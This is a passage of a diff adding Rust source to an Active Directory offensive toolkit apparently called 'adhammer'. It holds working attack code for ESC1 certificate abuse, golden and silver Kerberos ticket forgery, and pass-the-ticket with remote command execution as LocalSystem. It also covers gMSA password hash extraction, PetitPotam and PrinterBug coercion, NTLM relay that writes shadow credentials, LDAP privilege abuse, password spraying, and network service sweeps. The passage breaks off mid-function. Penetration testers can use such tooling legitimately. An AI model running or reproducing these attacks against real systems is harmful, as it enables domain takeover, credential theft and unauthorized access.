+    smb.login(&a.host, &a.domain, &a.user, &a.password).await?;
+    smb.tree_connect(&format!("\\\\{}\\IPC$", a.host)).await?;
+
+    let r = adhammer_dcerpc::icpr::request_cert(
+        &mut smb,
+        &a.ca,
+        &a.template,
+        &csr.der,
+        &a.domain,
+        &a.user,
+        &a.password,
+        &a.host,
+    )
+    .await?;
+
+    // Disposition: 3 = ISSUED, 5 = UNDER SUBMISSION (pending).
+    if r.disposition == 3 && !r.cert_der.is_empty() {
+        std::fs::write(&a.out, &r.cert_der)?;
+        let key_path = format!("{}.key.pem", a.out);
+        std::fs::write(&key_path, &csr.key_pem)?;
+        println!(
+            "[+] ESC1: certificate ISSUED for UPN {} → {} ({} bytes), key → {}",
+            a.upn,
+            a.out,
+            r.cert_der.len(),
+            key_path
+        );
+
+        if a.pkinit {
+            let kdc = a.kdc.clone().unwrap_or_else(|| a.host.clone());
+            let realm = a.upn.split('@').nth(1).unwrap_or(&a.domain).to_string();
+            match adhammer_kerberos::pkinit::pkinit_with_cert(
+                subject,
+                &realm,
+                &kdc,
+                &csr.key_pem,
+                Some(&r.cert_der),
+            )
+            .await
+            {
+                Ok(tgt) => {
+                    let ccache = format!("{subject}.ccache");
+                    std::fs::write(&ccache, &tgt.ccache)?;
+                    println!("[+] PKINIT OK — TGT obtained as {subject}; ccache → {ccache}");
+                    println!(
+                        "    KRB5CCNAME={ccache} → use for Kerberos auth (dcsync, exec via -k, …)"
+                    );
+                }
+                Err(e) => {
+                    println!("[-] PKINIT with the issued cert failed: {e:#}");
+                    if e.to_string().contains("error 66") {
+                        println!("    (KDC_ERR_CANT_VERIFY_CERTIFICATE — likely strong certificate-mapping");
+                        println!("     enforcement (KB5014754): a UPN-only cert has no SID mapping to the");
+                        println!("     target, so the KDC refuses it. ESC1 escalation is mitigated on this DC.");
+                        println!("     The cert was still issued — the template is vulnerable.)");
+                    }
+                }
+            }
+        } else {
+            println!(
+                "    next: --pkinit to turn this cert into a TGT as {}",
+                subject
+            );
+        }
+    } else {
+        println!(
+            "[-] enrollment not issued (disposition {}): {}",
+            r.disposition, r.message
+        );
+    }
+    Ok(())
+}
+
+/// Golden ticket: forge a TGT for an arbitrary identity, sealed + double-signed with the domain's
+/// krbtgt AES256 key. Accepted by fully-patched (KB5020805) KDCs because the forged PAC carries a
+/// valid KDC signature plus PAC_REQUESTOR/PAC_ATTRIBUTES.
+async fn golden(a: GoldenArgs) -> Result<()> {
+    use adhammer_kerberos::pac::ForgeIdentity;
+
+    let key = hex::decode(a.krbtgt_aes256.trim()).context("--krbtgt-aes256 must be hex")?;
+    anyhow::ensure!(
+        key.len() == 32,
+        "--krbtgt-aes256 must be a 64-hex AES256 key"
+    );
+    let subs: Vec<u32> = a
+        .domain_sid
+        .trim_start_matches("S-1-5-")
+        .split('-')
+        .map(|x| x.parse::<u32>())
+        .collect::<std::result::Result<_, _>>()
+        .context("--domain-sid must be S-1-5-21-a-b-c")?;
+
+    let id = ForgeIdentity {
+        user: a.user.clone(),
+        rid: a.rid,
+        primary_gid: 513,
+        group_rids: a.groups.clone(),
+        domain_subauths: subs,
+        logon_server: a.realm.split('.').next().unwrap_or("DC").to_uppercase(),
+        logon_domain: a.realm.split('.').next().unwrap_or("DOMAIN").to_uppercase(),
+    };
+    let tgt = adhammer_kerberos::forge_golden_tgt(&id, &a.realm, &key)?;
+    println!(
+        "[+] forged golden TGT: {}@{} (rid {}, groups {:?})",
+        a.user, a.realm, a.rid, a.groups
+    );
+
+    if let Some(spn) = &a.verify_spn {
+        match adhammer_kerberos::roast_spn(&tgt, &a.user, spn, &a.kdc).await {
+            Ok(_) => println!("[+] KDC accepted the golden ticket (TGS-REP for {spn})"),
+            Err(e) => println!("[-] KDC rejected the golden ticket for {spn}: {e}"),
+        }
+    }
+    if let Some(out) = &a.out {
+        let cc = adhammer_kerberos::golden_ccache(&tgt, &a.user)?;
+        std::fs::write(out, &cc)?;
+        println!(
+            "[+] wrote ccache → {out} ({} bytes). Use: KRB5CCNAME={out}",
+            cc.len()
+        );
+    }
+    Ok(())
+}
+
+/// Silver ticket: forge a service ticket (TGS) for an SPN, sealed + PAC-signed with the target
+/// service account's AES256 key. Presented directly to the service (AP-REQ) without the KDC —
+/// so the KDC signature is unchecked. Emits a ccache for use with `-k` / KRB5CCNAME tooling.
+async fn silver(a: SilverArgs) -> Result<()> {
+    use adhammer_kerberos::pac::ForgeIdentity;
+
+    let key = hex::decode(a.service_aes256.trim()).context("--service-aes256 must be hex")?;
+    anyhow::ensure!(
+        key.len() == 32,
+        "--service-aes256 must be a 64-hex AES256 key"
+    );
+    let subs: Vec<u32> = a
+        .domain_sid
+        .trim_start_matches("S-1-5-")
+        .split('-')
+        .map(|x| x.parse::<u32>())
+        .collect::<std::result::Result<_, _>>()
+        .context("--domain-sid must be S-1-5-21-a-b-c")?;
+
+    let id = ForgeIdentity {
+        user: a.user.clone(),
+        rid: a.rid,
+        primary_gid: 513,
+        group_rids: a.groups.clone(),
+        domain_subauths: subs,
+        logon_server: a.realm.split('.').next().unwrap_or("DC").to_uppercase(),
+        logon_domain: a.realm.split('.').next().unwrap_or("DOMAIN").to_uppercase(),
+    };
+    let tgt = adhammer_kerberos::forge_silver_tgt(&id, &a.realm, &key, &a.spn)?;
+    println!(
+        "[+] forged silver ticket: {}@{} for {} (rid {})",
+        a.user, a.realm, a.spn, a.rid
+    );
+    if let Some(out) = &a.out {
+        let cc = adhammer_kerberos::silver_ccache(&tgt, &a.user, &a.spn)?;
+        std::fs::write(out, &cc)?;
+        println!("[+] wrote ccache → {out} ({} bytes)", cc.len());
+    }
+    Ok(())
+}
+
+/// Pass-the-ticket: forge a golden or silver ticket, obtain a service ticket for the SPN, and
+/// authenticate to SMB with a Kerberos AP-REQ — then optionally run a command as the impersonated
+/// identity (LocalSystem via SVCCTL). The end-to-end proof that a forged ticket grants access.
+async fn pth(a: PthArgs) -> Result<()> {
+    use adhammer_kerberos::pac::ForgeIdentity;
+    use adhammer_smb::SmbClient;
+
+    let parse_key = |s: &str, what: &str| -> Result<Vec<u8>> {
+        let k = hex::decode(s.trim()).with_context(|| format!("{what} must be hex"))?;
+        anyhow::ensure!(k.len() == 32, "{what} must be a 64-hex AES256 key");
+        Ok(k)
+    };
+    let subs: Vec<u32> = a
+        .domain_sid
+        .trim_start_matches("S-1-5-")
+        .split('-')
+        .map(|x| x.parse::<u32>())
+        .collect::<std::result::Result<_, _>>()
+        .context("--domain-sid must be S-1-5-21-a-b-c")?;
+    let spn = a.spn.clone().unwrap_or_else(|| format!("cifs/{}", a.host));
+    let id = ForgeIdentity {
+        user: a.user.clone(),
+        rid: a.rid,
+        primary_gid: 513,
+        group_rids: a.groups.clone(),
+        domain_subauths: subs,
+        logon_server: a.realm.split('.').next().unwrap_or("DC").to_uppercase(),
+        logon_domain: a.realm.split('.').next().unwrap_or("DOMAIN").to_uppercase(),
+    };
+
+    // Build the service ticket: golden → TGS-REQ; silver → forged directly.
+    let st = match (&a.krbtgt_aes256, &a.service_aes256) {
+        (Some(k), None) => {
+            let key = parse_key(k, "--krbtgt-aes256")?;
+            let kdc = a.kdc.clone().unwrap_or_else(|| a.host.clone());
+            let tgt = adhammer_kerberos::forge_golden_tgt(&id, &a.realm, &key)?;
+            println!("[+] forged golden TGT for {}@{}", a.user, a.realm);
+            let st = adhammer_kerberos::get_service_ticket(&tgt, &spn, &kdc).await?;
+            println!("[+] got service ticket for {spn} (KDC accepted the golden TGT)");
+            st
+        }
+        (None, Some(k)) => {
+            let key = parse_key(k, "--service-aes256")?;
+            let tgt = adhammer_kerberos::forge_silver_tgt(&id, &a.realm, &key, &spn)?;
+            println!("[+] forged silver ticket for {spn}");
+            adhammer_kerberos::silver_service_ticket(&tgt, &spn)
+        }
+        _ => anyhow::bail!(
+            "provide exactly one of --krbtgt-aes256 (golden) or --service-aes256 (silver)"
+        ),
+    };
+
+    let (blob, key) = adhammer_kerberos::build_ap_req_gss(&st)?;
+    let mut smb = SmbClient::connect(&a.host).await?;
+    smb.login_kerberos(&blob, &key).await?;
+    println!(
+        "[+] Kerberos SMB session established as {} (pass-the-ticket)",
+        a.user
+    );
+
+    if let Some(cmd) = &a.command {
+        smb.tree_connect(&format!("\\\\{}\\IPC$", a.host)).await?;
+        let r = adhammer_dcerpc::svcctl::exec(&mut smb, &a.host, cmd).await?;
+        println!(
+            "[+] ran as LocalSystem (service '{}', win32 {})",
+            r.service, r.start_win32
+        );
+        match r.output {
+            Some(o) if !o.is_empty() => println!("\n{o}"),
+            _ => println!("[*] no output captured"),
+        }
+    } else {
+        smb.tree_connect(&format!("\\\\{}\\C$", a.host)).await?;
+        println!(
+            "[+] tree-connected \\\\{}\\C$ — authenticated access confirmed",
+            a.host
+        );
+    }
+    Ok(())
+}
+
+/// Read a gMSA's managed password over LDAP and derive its NT hash. The managed password is a
+/// constructed attribute the DC returns only over a sealed channel (LDAPS here) to principals in
+/// `msDS-GroupMSAMembership`. Output is PtH/hashcat-usable.
+async fn gmsa(a: GmsaArgs) -> Result<()> {
+    use adhammer_collector::{Collector, LdapConfig};
+    let cfg = LdapConfig {
+        url: a.url.clone(),
+        bind_dn: a.user.clone(),
+        password: a.password.clone(),
+        base_dn: None,
+        insecure: a.insecure,
+        gssapi: false,
+    };
+    let mut c = Collector::connect(&cfg).await?;
+    let blob = c
+        .read_attr_bin(&a.target, "msDS-ManagedPassword")
+        .await?
+        .context(
+            "msDS-ManagedPassword not returned (not a gMSA, no retrieve right, or not over LDAPS)",
+        )?;
+    let pw = parse_managed_password_blob(&blob).context("parse MSDS-MANAGEDPASSWORD_BLOB")?;
+    let nt = adhammer_ntlm::md4(&pw);
+    let nthex: String = nt.iter().map(|b| format!("{b:02x}")).collect();
+    // secretsdump-style line; the RID is unknown here, so print sam + hash.
+    println!("{}:aad3b435b51404eeaad3b435b51404ee:{}:::", a.target, nthex);
+    eprintln!(
+        "[+] gMSA {} current-password NT hash recovered ({} blob bytes)",
+        a.target,
+        blob.len()
+    );
+    Ok(())
+}
+
+/// Extract the CurrentPassword bytes from an MSDS-MANAGEDPASSWORD_BLOB (MS-ADTS §2.2.19).
+fn parse_managed_password_blob(b: &[u8]) -> Option<Vec<u8>> {
+    if b.len() < 16 {
+        return None;
+    }
+    let cur_off = u16::from_le_bytes([b[8], b[9]]) as usize; // CurrentPasswordOffset
+    let prev_off = u16::from_le_bytes([b[10], b[11]]) as usize; // PreviousPasswordOffset (0 = none)
+    let end = if prev_off > cur_off {
+        prev_off
+    } else {
+        b.len()
+    };
+    let pw = b.get(cur_off..end)?;
+    // The password buffer is a fixed 256-byte WCHAR[128]; hash exactly those bytes.
+    Some(pw.get(..256).unwrap_or(pw).to_vec())
+}
+
+/// PetitPotam-style coercion: make the DC authenticate to `--listener` via MS-EFSR.
+async fn coerce(a: CoerceArgs) -> Result<()> {
+    use adhammer_smb::SmbClient;
+
+    let mut smb = SmbClient::connect(&a.host).await?;
+    smb.login(&a.host, &a.domain, &a.user, &a.password).await?;
+    smb.tree_connect(&format!("\\\\{}\\IPC$", a.host)).await?;
+
+    if a.pipe.eq_ignore_ascii_case("spoolss") {
+        // PrinterBug (MS-RPRN): open a printer on the target, then RFFPCNEx → callback to us.
+        use adhammer_dcerpc::rprn::{printerbug_tcp, PrinterBug};
+        // Try the \spoolss SMB pipe first; modern spoolers only expose ncacn_ip_tcp (via EPM).
+        let target = a.target.clone().unwrap_or_else(|| a.host.clone());
+        let via_pipe = match smb.open_pipe("spoolss").await {
+            Ok(pipe) => {
+                let mut client = PrinterBug::bind(&mut smb, pipe).await?;
+                Some(client.coerce(&target, &a.listener).await)
+            }
+            Err(_) => None,
+        };
+        let result = match via_pipe {
+            Some(r) => r,
+            None => {
+                printerbug_tcp(
+                    &a.host,
+                    &a.domain,
+                    &a.user,
+                    &a.password,
+                    &target,
+                    &a.listener,
+                )
+                .await
+            }
+        };
+        match result {
+            Ok(status) => {
+                println!("[+] PrinterBug (RFFPCNEx) accepted — status {status:#010x}");
+                println!("    {} spooler attempted auth to \\\\{}\\... (run a relay/listener to capture)", a.host, a.listener);
+            }
+            Err(e) => {
+                println!("[-] PrinterBug failed/patched (spooler off or remote RPC blocked): {e}")
+            }
+        }
+        return Ok(());
+    }
+
+    // MS-EFSR (PetitPotam) over \lsarpc or \efsrpc.
+    use adhammer_dcerpc::efsr::CoerceClient;
+    let pipe = smb.open_pipe(&a.pipe).await?;
+    let mut client = CoerceClient::bind(&mut smb, pipe).await?;
+    match client.coerce(&a.listener).await {
+        Ok(status) => {
+            println!(
+                "[+] EfsRpcOpenFileRaw accepted via \\{} — status {status:#010x}",
+                a.pipe
+            );
+            println!(
+                "    DC {} attempted auth to \\\\{}\\... (run a relay/listener to capture)",
+                a.host, a.listener
+            );
+        }
+        Err(e) => println!("[-] coercion via \\{} failed/patched: {e}", a.pipe),
+    }
+    Ok(())
+}
+
+/// Active LDAP abuse — the exploitation counterpart to the ACL findings the graph reports.
+async fn abuse(a: AbuseArgs) -> Result<()> {
+    // pkinit is a KDC exchange, not an LDAP write — handle it before touching LDAP.
+    if a.action == "pkinit" {
+        let realm = a.realm.clone().context("pkinit needs --realm")?;
+        let kdc = a.kdc.clone().context("pkinit needs --kdc")?;
+        let key_path = if a.value.is_empty() {
+            format!("{}.key.pem", a.target)
+        } else {
+            a.value.clone()
+        };
+        let pem =
+            std::fs::read_to_string(&key_path).with_context(|| format!("read key {key_path}"))?;
+        let tgt =
+            adhammer_kerberos::pkinit::pkinit_authenticate(&a.target, &realm, &kdc, &pem).await?;
+        let cc_path = format!("{}.ccache", a.target);
+        std::fs::write(&cc_path, &tgt.ccache)?;
+        println!(
+            "[+] PKINIT succeeded — TGT for {}@{} (via {})",
+            a.target, realm, tgt.sname
+        );
+        println!("    reply key derived from DH + AS-REP enc-part decrypted (holder of the registered key)");
+        println!("    ticket valid until {}", tgt.end_time);
+        println!("    ccache saved to {cc_path}  (export KRB5CCNAME={cc_path})");
+        return Ok(());
+    }
+
+    // add-keycred over raw LDAP-389 + NTLM SASL (no LDAPS) — also the relay code path.
+    if a.ldap389 {
+        let host = a.host.clone().context("--ldap389 needs --host")?;
+        let realm = a.realm.clone().context("--ldap389 needs --realm")?;
+        let user = a.user.clone().context("--ldap389 needs --user")?;
+        let password = a.password.clone().context("--ldap389 needs --password")?;
+        let bare = user
+            .split('@')
+            .next()
+            .unwrap_or(&user)
+            .rsplit('\\')
+            .next()
+            .unwrap_or(&user)
+            .to_string();
+        let base: String = realm
+            .split('.')
+            .map(|p| format!("DC={p}"))
+            .collect::<Vec<_>>()
+            .join(",");
+        let mut ld = adhammer_ldap::LdapClient::connect(&format!("{host}:389")).await?;
+        ld.bind_ntlm(&realm, &bare, &password, "ADHAMMER").await?;
+        let dn = ld.find_dn(&base, &a.target).await?;
+        let kc = adhammer_kerberos::shadowcred::build_key_credential(&dn)?;
+        ld.modify_add(&dn, "msDS-KeyCredentialLink", kc.dn_binary.as_bytes())
+            .await?;
+        std::fs::write(format!("{}.key.pem", a.target), &kc.private_key_pem)?;
+        println!("[+] LDAP-389 (NTLM SASL) add-keycred on {dn}");
+        println!(
+            "    key saved to {}.key.pem — Phase 2: attack abuse --action pkinit --target {}",
+            a.target, a.target
+        );
+        return Ok(());
+    }
+
+    let cfg = LdapConfig {
+        url: a.url.clone().context("this action needs --url")?,
+        bind_dn: a.user.clone().context("this action needs --user")?,
+        password: a.password.clone().context("this action needs --password")?,
+        base_dn: None,
+        insecure: a.insecure,
+        gssapi: false,
+    };
+    let mut c = Collector::connect(&cfg).await?;
+    let target_dn = c.resolve_dn(&a.target).await?;
+
+    match a.action.as_str() {
+        "add-spn" => {
+            c.add_value(&target_dn, "servicePrincipalName", &a.value).await?;
+            println!("[+] added SPN '{}' to {} — now Kerberoastable", a.value, a.target);
+        }
+        "add-member" => {
+            let member_dn = c.resolve_dn(&a.value).await?;
+            c.add_value(&target_dn, "member", &member_dn).await?;
+            println!("[+] added {} to group {}", a.value, a.target);
+        }
+        "set-password" => {
+            c.set_password(&target_dn, &a.value).await?;
+            println!("[+] reset password of {}", a.target);
+        }
+        "add-keycred" => {
+            // Shadow Credentials: add a KeyCredential to the target's msDS-KeyCredentialLink.
+            let kc = adhammer_kerberos::shadowcred::build_key_credential(&target_dn)?;
+            c.add_value(&target_dn, "msDS-KeyCredentialLink", &kc.dn_binary).await?;
+            let key_path = format!("{}.key.pem", a.target);
+            std::fs::write(&key_path, &kc.private_key_pem)?;
+            println!("[+] added Shadow Credential to {} — key saved to {key_path}", a.target);
+            println!("    (Phase 2: PKINIT with this key to obtain a TGT as {})", a.target);
+        }
+        "write-rbcd" => {
+            // value = SID (S-1-...) or sAMAccountName of the principal to grant delegation.
+            let trustee = if a.value.starts_with("S-") {
+                adhammer_core::sid::Sid::parse(&a.value).context("bad SID")?
+            } else {
+                c.resolve_sid(&a.value).await?
+            };
+            let sd = adhammer_sddl::build_rbcd_sd(&trustee);
+            c.write_binary(&target_dn, "msDS-AllowedToActOnBehalfOfOtherIdentity", sd).await?;
+            println!("[+] wrote RBCD on {} allowing {} to impersonate to it", a.target, a.value);
+        }
+        other => anyhow::bail!("unknown action '{other}' (add-spn|add-member|set-password|write-rbcd|add-keycred|pkinit)"),
+    }
+    Ok(())
+}
+
+/// Kerberos password spray: one password across a user list, classified by KDC response.
+async fn spray(a: SprayArgs) -> Result<()> {
+    use adhammer_kerberos::{check_credential, CredResult};
+
+    let users: Vec<String> = if let Some(path) = a.users.strip_prefix('@') {
+        std::fs::read_to_string(path)?
+            .lines()
+            .map(|l| l.trim().to_string())
+            .filter(|l| !l.is_empty())
+            .collect()
+    } else {
+        a.users
+            .split(',')
+            .map(|u| u.trim().to_string())
+            .filter(|u| !u.is_empty())
+            .collect()
+    };
+
+    for u in &users {
+        match check_credential(u, &a.password, &a.realm, &a.kdc).await {
+            Ok(CredResult::Valid) => println!("[+] VALID           {u}:{}", a.password),
+            Ok(CredResult::ValidButExpired) => println!("[+] VALID (expired) {u}:{}", a.password),
+            Ok(CredResult::Disabled) => println!("[-] disabled/locked {u}"),
+            Ok(CredResult::NoPreAuth) => println!("[*] AS-REP roastable {u} (no pre-auth)"),
+            Ok(CredResult::Invalid) | Ok(CredResult::NoSuchUser) => {} // quiet
+            Ok(CredResult::Other(c)) => eprintln!("    {u}: KDC error {c}"),
+            Err(e) => eprintln!("    {u}: {e}"),
+        }
+    }
+    Ok(())
+}
+
+/// LSAT name→SID over \lsarpc (SMB2 → NTLM → DCE/RPC → LsarOpenPolicy2 → LsarLookupNames).
+async fn lsa(a: LsaArgs) -> Result<()> {
+    use adhammer_dcerpc::lsat::LsatClient;
+    use adhammer_smb::SmbClient;
+
+    let mut smb = SmbClient::connect(&a.host).await?;
+    smb_login(
+        &mut smb,
+        &a.host,
+        &a.domain,
+        &a.user,
+        &a.password,
+        &a.nt_hash,
+    )
+    .await?;
+    smb.tree_connect(&format!("\\\\{}\\IPC$", a.host)).await?;
+    let pipe = smb.open_pipe("lsarpc").await?;
+
+    let mut client = LsatClient::bind(&mut smb, pipe).await?;
+    let policy = client.open_policy().await?;
+    match client.lookup_name(&policy, &a.name).await? {
+        Some(sid) => println!("{} => {sid}", a.name),
+        None => println!("{} => (not mapped)", a.name),
+    }
+    Ok(())
+}
+
+/// Full impacket-style path: SMB2 negotiate → NTLM session → IPC$ → \samr pipe →
+/// DCE/RPC bind → SamrConnect → enumerate domain users.
+async fn samr(a: SamrArgs) -> Result<()> {
+    use adhammer_dcerpc::samr::SamrClient;
+    use adhammer_smb::SmbClient;
+
+    let mut smb = SmbClient::connect(&a.host).await?;
+    smb_login(
+        &mut smb,
+        &a.host,
+        &a.domain,
+        &a.user,
+        &a.password,
+        &a.nt_hash,
+    )
+    .await?;
+    tracing::info!("SMB session established");
+    smb.tree_connect(&format!("\\\\{}\\IPC$", a.host)).await?;
+    let pipe = smb.open_pipe("samr").await?;
+    tracing::info!("\\samr pipe open");
+
+    let mut client = SamrClient::bind(&mut smb, pipe).await?;
+    let users = client
+        .enumerate_all_users(&format!("\\\\{}", a.host))
+        .await?;
+    println!("== SAMR users ({}) ==", users.len());
+    for (rid, name) in users {
+        println!("  {rid}\t{name}");
+    }
+    Ok(())
+}
+
+/// Common service ports scanned by the network sweep (FTP → RDP and the rest of the estate).
+const SERVICES: &[(u16, &str)] = &[
+    (21, "ftp"),
+    (22, "ssh"),
+    (23, "telnet"),
+    (25, "smtp"),
+    (53, "dns"),
+    (80, "http"),
+    (88, "kerberos"),
+    (110, "pop3"),
+    (111, "rpcbind"),
+    (135, "msrpc"),
+    (139, "netbios"),
+    (143, "imap"),
+    (389, "ldap"),
+    (443, "https"),
+    (445, "smb"),
+    (464, "kpasswd"),
+    (587, "smtp"),
+    (636, "ldaps"),
+    (873, "rsync"),
+    (993, "imaps"),
+    (995, "pop3s"),
+    (1433, "mssql"),
+    (1521, "oracle"),
+    (2049, "nfs"),
+    (3268, "gc"),
+    (3306, "mysql"),
+    (3389, "rdp"),
+    (5432, "postgres"),
+    (5900, "vnc"),
+    (5985, "winrm"),
+    (5986, "winrm-s"),
+    (6379, "redis"),
+    (8080, "http-alt"),
+    (8443, "https-alt"),
+    (9200, "elastic"),
+];
+/// Ports whose services send a text greeting on connect — grab it for version intel.
+const GREETERS: &[u16] = &[21, 22, 25, 110, 143];
+
+/// NTLM relay: receive a coerced/poisoned SMB auth and relay it to a DC's LDAP as the victim,
+/// then write a Shadow Credential on `target_object`. Chain with `attack coerce`/`poison`.
+async fn relay(a: RelayArgs) -> Result<()> {
+    use adhammer_smb::server::RelayConn;
+    let base: String = a
+        .realm
+        .split('.')
+        .map(|p| format!("DC={p}"))
+        .collect::<Vec<_>>()
+        .join(",");
+    let listener = RelayConn::listen(&a.listen).await?;
+    println!(
+        "[*] relay listening on {} → LDAP {} (write keycred on {})",
+        a.listen, a.target_dc, a.target_object
+    );
+    println!("    now coerce/poison a victim toward this host (e.g. attack coerce --pipe spoolss --listener <us>)");
+    loop {
+        let (stream, peer) = listener.accept().await?;
+        let (target_dc, base, target_object) =
+            (a.target_dc.clone(), base.clone(), a.target_object.clone());
+        tokio::spawn(async move {
+            if let Err(e) =
+                relay_one(stream, &peer.to_string(), &target_dc, &base, &target_object).await
+            {
+                println!("[-] relay from {peer} failed: {e}");
+            }
+        });
+    }
+}
+
+async fn relay_one(
+    stream: tokio::net::TcpStream,
+    peer: &str,
+    target_dc: &str,
+    base: &str,
+    target_object: &str,
+) -> Result<()> {
+    use adhammer_smb::server::RelayConn;
+    let mut rc = RelayConn::new(stream);
+    let type1 = rc.recv_type1().await?;
+    println!("[+] victim {peer} started NTLM — relaying to {target_dc} LDAP");
+    let mut ld = adhammer_ldap::LdapClient::connect(&format!("{target_dc}:389")).await?;
+    let type2 = ld.sasl_step1(&type1).await?; // target's challenge
+    rc.send_challenge(&type2).await?; // → victim signs the target's challenge
+    let type3 = rc.recv_type3().await?;
+    ld.sasl_step2(&type3).await?; // now authenticated to the DC AS the victim
+    println!("[+] relayed bind to {target_dc} succeeded as the victim");
+    let dn = ld.find_dn(base, target_object).await?;
+    let kc = adhammer_kerberos::shadowcred::build_key_credential(&dn)?;
+    ld.modify_add(&dn, "msDS-KeyCredentialLink", kc.dn_binary.as_bytes())
+        .await?;
+    std::fs::write(format!("{target_object}.key.pem"), &kc.private_key_pem)?;
+    println!("[+] Shadow Credential written on {dn} — key {target_object}.key.pem");
+    println!("    → attack abuse --action pkinit --target {target_object} --realm <realm> --kdc {target_dc}");
+    Ok(())
+}
+
+/// Network sweep: full service scan + banner grab per target, DC detection, and SMB signing
+/// (NTLM-relay) posture — the attack-surface map for the whole estate.
+async fn netenum(a: NetArgs) -> Result<()> {
+    let hosts = expand_targets(&a.targets)?;
+    eprintln!(
+        "[*] sweeping {} hosts × {} ports…",
+        hosts.len(),
+        SERVICES.len()
+    );
+
+    let sem = std::sync::Arc::new(tokio::sync::Semaphore::new(a.concurrency));
+    let mut set = tokio::task::JoinSet::new();
+    for host in hosts {
+        for &(port, svc) in SERVICES {
+            let sem = sem.clone();
+            let host = host.clone();
+            set.spawn(async move {
+                let _permit = sem.acquire().await.ok()?;
+                let banner = probe_port(&host, port).await?; // None if closed
+                Some((host, port, svc, banner))
+            });
+        }
+    }
+    // Group open ports by host.
+    let mut hosts_map: std::collections::HashMap<String, Vec<(u16, &str, Option<String>)>> =
+        Default::default();
+    while let Some(r) = set.join_next().await {
+        if let Ok(Some((host, port, svc, banner))) = r {
+            hosts_map.entry(host).or_default().push((port, svc, banner));
+        }
+    }
+
+    // SMB signing (relay) posture for hosts exposing 445.
+    let mut signing: std::collections::HashMap<String, (u16, bool)> = Default::default();
+    for (host, ports) in &hosts_map {
+        if ports.iter().any(|(p, _, _)| *p == 445) {
+            if let Ok(mut c) = adhammer_smb::SmbClient::connect(host).await {
+                if let Ok(s) = c.probe_signing().await {
+                    signing.insert(host.clone(), s);
+                }
+            }
+        }
+    }
+
+    let mut hosts_sorted: Vec<_> = hosts_map.into_iter().collect();
+    hosts_sorted.sort_by_key(|(h, _)| {
+        h.parse::<std::net::Ipv4Addr>()
+            .map(u32::from)
+            .unwrap_or(u32::MAX)
+    });
+
+    println!("== network sweep: {} live hosts ==", hosts_sorted.len());
+    let mut relay = Vec::new();
+    for (host, mut ports) in hosts_sorted {
+        ports.sort_by_key(|(p, _, _)| *p);
+        let has = |p: u16| ports.iter().any(|(x, _, _)| *x == p);
+        let role = if has(88) && has(389) { "DC  " } else { "host" };
+        println!("  {host:<15} {role}");
+        for (port, svc, banner) in &ports {
+            let b = banner
+                .as_deref()
+                .map(|s| format!("  {s}"))
+                .unwrap_or_default();
+            println!("      {port:<5} {svc:<10}{b}");
+        }
+        if let Some((d, req)) = signing.get(&host) {
+            if *req {
+                println!("      445   smb-signing REQUIRED (0x{d:04x})");
+            } else {
+                println!("      445   smb-signing OFF → NTLM-RELAY TARGET (0x{d:04x})");
+                relay.push(host.clone());
+            }
+        }
+        if a.deep {
+            for (port, _, _) in &ports {
+                if let Some(finding) = deep_check(&host, *port, a.zone.as_deref()).await {
+                    println!("      [!]   {port:<5} {finding}");
+                }
+            }
+            // SNMP is UDP/161 — not in the TCP sweep, so probe it per host under --deep.
+            if let Some(finding) = snmp_public(&host, &a.community).await {
+                println!("      [!]   161   {finding}");
+            }
+        }
+    }
+    if !relay.is_empty() {
+        println!(
+            "\n[+] {} NTLM-relay target(s) (SMB signing not required): {}",
+            relay.len(),
+            relay.join(", ")
+        );
+    }
+    Ok(())
+}
+
+/// Connect to `host:port` (timeout). Returns Some(banner) if open — banner is the service
+/// greeting for text protocols, empty otherwise; None if the port is closed/filtered.
+async fn probe_port(host: &str, port: u16) -> Option<Option<String>> {
+    use tokio::io::AsyncReadExt;
+    use tokio::time::{timeout, Duration};
+    let connect = tokio::net::TcpStream::connect((host, port));
+    let mut stream = match timeout(Duration::from_millis(800), connect).await {
+        Ok(Ok(s)) => s,
+        _ => return None, // closed / filtered
+    };
+    if !GREETERS.contains(&port) {
+        return Some(None);
+    }
+    // Read the service greeting (FTP/SSH/SMTP/POP3/IMAP announce on connect).
+    let mut buf = [0u8; 256];
+    let banner = match timeout(Duration::from_millis(600), stream.read(&mut buf)).await {
+        Ok(Ok(n)) if n > 0 => {
+            let line = String::from_utf8_lossy(&buf[..n]);
+            Some(line.lines().next().unwrap_or("").trim().to_string())
+        }
+        _ => None,
+    };
+    Some(banner)
+}
+
+/// Per-service unauthenticated attack checks (--deep).
+async fn deep_check(host: &str, port: u16, zone: Option<&str>) -> Option<String> {
+    match port {
+        21 => ftp_anon(host).await,
+        25 => smtp_vrfy(host).await,
+        53 => dns_check(host, zone).await,
+        111 => nfs_showmount(host).await, // portmap → mountd EXPORT; covers NFS behind it
+        135 => rpc_surface(host).await,
+        873 => rsync_modules(host).await,
+        1433 => mssql_prelogin(host).await,
+        3306 => mysql_probe(host).await,
+        6379 => redis_unauth(host).await,
+        5900 => vnc_noauth(host).await,
+        5985 | 5986 => winrm_probe(host, port).await,
+        _ => None,
+    }
+}
+
+async fn connect(host: &str, port: u16) -> Option<tokio::net::TcpStream> {
+    tokio::time::timeout(
+        std::time::Duration::from_millis(1200),
+        tokio::net::TcpStream::connect((host, port)),
+    )
+    .await
+    .ok()?
+    .ok()
+}
+async fn read_some(s: &mut tokio::net::TcpStream, buf: &mut [u8]) -> usize {
+    use tokio::io::AsyncReadExt;
+    tokio::time::timeout(std::time::Duration::from_millis(900), s.read(buf))
+        .await
+        .ok()
+        .and_then(|r| r.ok())
+        .unwrap_or(0)
+}
+
+async fn ftp_anon(host: &str) -> Option<String> {
+    use tokio::io::AsyncWriteExt;
+    let mut s = connect(host, 21).await?;
+    let mut buf = [0u8; 512];
+    read_some(&mut s, &mut buf).await; // 220 banner
+    s.write_all(b"USER anonymous\r\n").await.ok()?;
+    read_some(&mut s, &mut buf).await;
+    s.write_all(b"PASS anonymous@adhammer\r\n").await.ok()?;
+    let n = read_some(&mut s, &mut buf).await;
+    String::from_utf8_lossy(&buf[..n])
+        .starts_with("230")
+        .then(|| "FTP: ANONYMOUS LOGIN ALLOWED".to_string())
+}
+
+async fn smtp_vrfy(host: &str) -> Option<String> {
+    use tokio::io::AsyncWriteExt;
+    let mut s = connect(host, 25).await?;
+    let mut buf = [0u8; 512];
+    read_some(&mut s, &mut buf).await;
+    s.write_all(b"VRFY root\r\n").await.ok()?;
+    let n = read_some(&mut s, &mut buf).await;
+    let r = String::from_utf8_lossy(&buf[..n]);
+    (r.starts_with("250") || r.starts_with("252"))
+        .then(|| "SMTP: VRFY enabled (user enumeration)".to_string())
+}
+
+async fn redis_unauth(host: &str) -> Option<String> {
